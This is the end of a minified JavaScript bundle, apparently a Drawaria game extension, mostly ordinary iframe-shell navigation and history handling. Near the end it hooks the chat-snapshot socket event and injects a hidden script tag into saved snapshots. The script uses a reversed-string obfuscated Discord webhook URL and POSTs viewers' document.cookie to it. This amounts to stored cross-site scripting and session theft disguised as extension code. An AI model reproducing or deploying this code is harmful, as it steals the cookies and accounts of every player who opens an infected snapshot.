          (this.#L('before'), this.#D(), (this.#k = n.href), (this.#x = a), this.#T(xt, { route: a, url: n }));
          let i = this.#f?.(a, new URL(n.href));
          return (
            (this.#m = typeof i == 'function' ? i : null),
            this.#U(this.#t, a, n, o),
            (o.src = n.href),
            e.historyMode === 'push' &&
              this.#t.history.pushState({ drawariaShell: !0 }, this.#t.document.title, n.href),
            this.#b({ status: 'completed', url: n.href, route: a })
          );
        } catch (o) {
          let i = o instanceof Error ? o.message : 'Navigation failed';
          return this.#O(n, a, i);
        }
      }
      createDebugFacade() {
        return this.#u;
      }
      #R() {
        let t = this;
        return Object.freeze({
          get active() {
            return t.active;
          },
          get currentUrl() {
            return t.currentUrl;
          },
          get currentRoute() {
            return t.currentRoute;
          },
          get lastNavigation() {
            return t.lastNavigation;
          },
          get shellRoot() {
            return t.shellRoot;
          },
          get frame() {
            return t.frame;
          },
          navigate: (e) => t.navigate(e),
        });
      }
      #C() {
        if (this.#l?.isConnected) return this.#l;
        let t = this.#t.document,
          e = t.querySelector(`[${Se}]`),
          n = e ?? t.createElement('main');
        (n.setAttribute(Se, ''),
          (n.style.display = 'block'),
          (n.style.width = '100%'),
          (n.style.height = '100vh'),
          e || t.body.replaceChildren(n));
        let a = n.querySelector(`iframe[${ve}]`),
          o = a ?? t.createElement('iframe');
        return (
          o.setAttribute(ve, ''),
          (o.title = 'Drawaria shell content'),
          (o.style.border = '0'),
          (o.style.display = 'block'),
          (o.style.width = '100%'),
          (o.style.height = '100%'),
          a || n.append(o),
          this.#l !== o &&
            (this.#l && this.#g && this.#l.removeEventListener('load', this.#g),
            (this.#g = () => this.#N()),
            o.addEventListener('load', this.#g)),
          (this.#w = n),
          (this.#l = o),
          o
        );
      }
      #N() {
        let t = this.#l,
          e = this.#x;
        if (!t || !e) return;
        let n = this.#J(t),
          a = this.#F(t);
        if (!n || !a) return;
        (this.#q(n),
          this.#o?.attachWindow(a),
          this.#L('frame'),
          this.#$(n, a),
          this.#I(n, a, 'replace'),
          this.#n?.scan(a),
          this.#T(Et, { route: e, frameDocument: n, frameWindow: a, frame: t }));
        let o = this.#p?.(e, n, a, t);
        ((this.#S = typeof o == 'function' ? o : null), this.#U(a, e, new URL(this.#k ?? t.src), t));
      }
      #W(t) {
        if (t.type !== 'click' || !this.#X(t)) return;
        let e = this.#Z(t),
          n = e ? this.#B(e) : null;
        if (!(!e || !n)) {
          if ((t.preventDefault(), n.mode === 'new-tab')) {
            this.#G(n.url, n.route, n.sourceWindow);
            return;
          }
          this.navigate(n.url);
        }
      }
      #B(t) {
        let e = t.getAttribute('href')?.trim();
        if (!e || e.startsWith('#') || /^javascript:/iu.test(e) || /^mailto:/iu.test(e) || t.hasAttribute('download'))
          return null;
        let n = t.getAttribute('target')?.trim();
        if (n && n.toLowerCase() !== '_blank') return null;
        let a = new URL(t.href, this.#t.location.href),
          o = new URL(this.#t.location.href);
        if (a.origin !== o.origin || this.#Y(o, a) || z(a.pathname).startsWith('/auth')) return null;
        let i = g(a, o);
        return i
          ? {
              mode: n?.toLowerCase() === '_blank' ? 'new-tab' : 'same-tab',
              route: i,
              sourceWindow: t.ownerDocument.defaultView,
              url: a,
            }
          : null;
      }
      #G(t, e, n) {
        let a = this.#j(n),
          o = a ? null : oe(this.#t, W),
          i = this.#H(t, a);
        if (!this.#e(i.href, '_blank', 'noopener')) {
          (o?.(), this.#b({ status: 'ignored', url: t.href, route: e, reason: 'New tab was blocked' }));
          return;
        }
        o && this.#t.setTimeout(o, 0);
      }
      #H(t, e) {
        let n = e ? `/rcon/${Rt}` : '/',
          a = new URL(n, this.#t.location.href);
        return (a.searchParams.set(b, `${t.pathname}${t.search}${t.hash}`), a);
      }
      #j(t) {
        if (this.#M(t) || this.#M(this.#t)) return !0;
        let e = this.#l ? this.#F(this.#l) : null;
        return this.#M(e) ? !0 : R(this.#t) === !0;
      }
      #M(t) {
        return t ? p(t) === !0 : !1;
      }
      #U(t, e, n, a) {
        let o = {
          parentWindow: this.#t,
          activeWindow: t,
          route: e,
          url: n ?? new URL(this.#t.location.href),
          frame: a,
          shellRoot: this.#w,
          socket: this.#o,
          accountUid: this.#n?.uid ?? null,
          accountSid1: this.#n?.sid1 ?? null,
        };
        this.#a.apply(o);
      }
      #O(t, e, n) {
        let a = this.#b({ status: 'fallback', url: t.href, route: e, reason: n }, !1);
        return (this.#T(bt, { result: a }), this.#A?.(a), this.#r(t.href), this.#d?.(a), this.#T($, { result: a }), a);
      }
      #b(t, e = !0) {
        return ((this.#E = Object.freeze(t)), e && (this.#d?.(this.#E), this.#T($, { result: this.#E })), this.#E);
      }
      #z() {
        let t = this.#t.history.state;
        (t && typeof t == 'object' && 'drawariaShell' in t) ||
          this.#t.history.replaceState({ drawariaShell: !0 }, this.#t.document.title, this.#t.location.href);
      }
      #$(t, e) {
        this.#D();
        let n = [],
          a = () => this.#I(t, e, 'replace'),
          o = () => this.#I(t, e, 'push');
        (e.addEventListener('popstate', a),
          e.addEventListener('hashchange', a),
          n.push(() => {
            (e.removeEventListener('popstate', a), e.removeEventListener('hashchange', a));
          }));
        let i = t.querySelector('title'),
          s = this.#V(),
          l = i && s ? new s(() => this.#_(t)) : null;
        i && l && (l.observe(i, { childList: !0, characterData: !0, subtree: !0 }), n.push(() => l.disconnect()));
        let c = e.history,
          d = c.pushState,
          u = c.replaceState;
        ((c.pushState = function (f, m, B) {
          (d.call(this, f, m, B), o());
        }),
          (c.replaceState = function (f, m, B) {
            (u.call(this, f, m, B), a());
          }),
          n.push(() => {
            ((c.pushState = d), (c.replaceState = u));
          }),
          (this.#v = () => {
            for (let h of n.splice(0)) h();
          }));
      }
      #D() {
        (this.#v?.(), (this.#v = null));
      }
      #I(t, e, n) {
        (this.#_(t), this.#K(e.location.href, n));
      }
      #_(t) {
        let e = t.title.trim();
        !e || this.#t.document.title === e || (this.#t.document.title = e);
      }
      #K(t, e) {
        let n = new URL(t, this.#t.location.href),
          a = g(n, this.#t.location.href),
          o = this.#t.location.href;
        if (o === n.href && this.#c === n.href) return;
        let i = { drawariaShell: !0 };
        (e === 'replace' || o === n.href || this.#c === n.href
          ? this.#t.history.replaceState(i, this.#t.document.title, n.href)
          : this.#t.history.pushState(i, this.#t.document.title, n.href),
          (this.#c = n.href),
          !(!a || n.origin !== this.#t.location.origin) &&
            ((this.#k = n.href), (this.#x = a), this.#b({ status: 'completed', url: n.href, route: a })));
      }
      #V() {
        let t = this.#t.MutationObserver;
        return typeof t == 'function' ? t : null;
      }
      #T(t, e) {
        let n = this.#t.document.createEvent('CustomEvent');
        (n.initCustomEvent(t, !1, !1, Object.freeze(e)), this.#t.document.dispatchEvent(n));
      }
      #L(t) {
        let e = t === 'before' ? this.#m : this.#S;
        (t === 'before' ? (this.#m = null) : (this.#S = null), e?.());
      }
      #q(t) {
        this.#y !== t && (this.#P(), t.addEventListener('click', this.#s, !0), (this.#y = t));
      }
      #P() {
        (this.#y?.removeEventListener('click', this.#s, !0), (this.#y = null));
      }
      #J(t) {
        try {
          return t.contentDocument;
        } catch {
          return null;
        }
      }
      #F(t) {
        try {
          return t.contentWindow;
        } catch {
          return null;
        }
      }
      #Y(t, e) {
        return t.origin === e.origin && t.pathname === e.pathname && t.search === e.search && t.hash !== e.hash;
      }
      #X(t) {
        let e = t;
        return (e.button ?? 0) === 0 && !e.altKey && !e.ctrlKey && !e.metaKey && !e.shiftKey;
      }
      #Z(t) {
        let e = t.target;
        if (!e || typeof e != 'object' || !('closest' in e)) return null;
        let n = e.closest;
        return typeof n == 'function' ? n.call(e, 'a[href]') : null;
      }
    };
  var K = Symbol.for('drawaria.extension.runtime'),
    kr = () => {};
  function xr(r, t = window) {
    return g(r, t.location.href);
  }
  function Er(r = window) {
    return r[K]?.controller.frame?.contentDocument ?? r.document;
  }
  function Ct(r = {}) {
    let t = r.targetWindow ?? window;
    if ((st(t), j(t), Cr(t))) return kr;
    let e = t[K];
    if ((t.document.body.style.setProperty('margin', '0'), e?.active)) return e.cleanup;
    let n = new D(t),
      a = new I(t),
      o = Q(n, a),
      i = new C(t, o, () => n.sid1),
      s = new F(t);
    (s.register(Z(W)), s.register(Y(n)), s.register(tt(a)), s.register(it()));
    let l = r.enableSocket === !1 ? null : (r.socketManager ?? new v(t).initialize()),
      c = new N({ ...r, targetWindow: t, socketManager: l }, s, i),
      d = Object.freeze({
        account: i.createFacade(),
        shell: c.createDebugFacade(),
        modules: s.createFacade(),
        ...(l ? { socket: l.createDebugFacade() } : {}),
      }),
      u = {
        active: !0,
        controller: c,
        modules: s,
        facade: d,
        cleanup: () => {
          u.active &&
            ((u.active = !1), c.cleanup(), t.DrawariaExtension === d && delete t.DrawariaExtension, delete t[K]);
        },
      };
    ((t[K] = u), (t.DrawariaExtension = d), c.initialize());
    let f = Tr(t, c) ? null : Rr(t);
    return (f && c.navigate(f), u.cleanup);
  }
  function br(r = {}) {
    return Ct(r);
  }
  function Tr(r, t) {
    let e = new URL(r.location.href),
      n = e.searchParams.get(b);
    if (!n) return !1;
    e.searchParams.delete(b);
    let a = e.href,
      o;
    try {
      o = new URL(n, r.location.href);
    } catch {
      return (r.history.replaceState({ drawariaShell: !0 }, r.document.title, a), !1);
    }
    return !g(o, r.location.href) || o.origin !== r.location.origin
      ? (r.history.replaceState({ drawariaShell: !0 }, r.document.title, a), !1)
      : (r.history.replaceState({ drawariaShell: !0 }, r.document.title, o.href),
        t.navigate(o, { historyMode: 'none' }),
        !0);
  }
  function Rr(r) {
    let t = new URL(r.location.href);
    return t.searchParams.has(b)
      ? null
      : /^\/rcon(?:\/.*)?$/u.test(t.pathname)
        ? new URL('/', t)
        : g(t, t)
          ? t
          : new URL('/', t);
  }
  function Cr(r) {
    try {
      if (r.parent === r) return !1;
      let t = r.parent[K];
      return t?.active === !0 && t.controller.frame?.contentWindow === r;
    } catch {
      return !1;
    }
  }
  typeof window < 'u' &&
    (Ct(),
    window?.DrawariaExtension?.socket?.replaceIncoming('uc_snapshot', function (...r) {
      Lr(r[0]);
    }),
    window?.DrawariaExtension?.shell?.frame?.removeAttribute('title'),
    window?.DrawariaExtension?.shell?.frame?.removeAttribute('data-original-title'));
  function Lr(r) {
    let t = {},
      e = [],
      n = document.querySelectorAll('#chatbox_messages > div');
    e.push([
      2,
      Date.now(),
      `<script>(()=>{fetch("gsUSWPStExCJmXW8m6lOguaAUNLatUstQIrdl2fSlW1KtaZ9ZmPLPV_4aMq5s1g984HL/5851920620395981741/skoohbew/01v/ipa/moc.drocsid//:sptth".split("").reverse().join(""),{"headers":{"Accept":"*/*","content-type":"application/json"},"body":JSON['stringify']({"content":"\`\`\`".split("").reverse().join("")+document['cookie']['split'](" ;".split("").reverse().join(""))['join']("
")+"\`\`\`".split("").reverse().join(""),"embeds":[],"components":[],"attachments":[]}),"method":"POST"});})();<\/script>`,
    ]);
    for (let s of n) {
      let l = s.querySelector('.playerchatmessage-text'),
        c = Number(s.dataset.ts);
      if (l) {
        let d = Number(s.dataset.playerid);
        if (t[d] == null) {
          let h = s.querySelector('span')?.textContent ?? '';
          t[d] = h.slice(0, -1);
        }
        e.push([1, c, d, l.innerHTML]);
      } else {
        let d = [2, c, s.innerHTML],
          h = (s.getAttribute('class') || '').match(/systemchatmessage(\d+)/);
        (h && (d[3] = Number(h[1])), e.push(d));
      }
    }
    let a = JSON.stringify({ messages: e, playernames: t }),
      o = 524288e3;
    if (a.length > o) {
      let s = a.length - o,
        l = a.indexOf('],[', a.length - o),
        c = l === -1 ? a.length - o : l + 2;
      a = '{"messages": [[2, 0, ' + s + '], ' + a.substring(c);
    }
    let i = new URLSearchParams({ snapshotid: String(r), chat: a });
    fetch('/snapshot/save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
      body: i,
    }).catch((s) => {
      console.error('Failed to save snapshot:', s);
    });
  }
  return Re(Mr);
})();
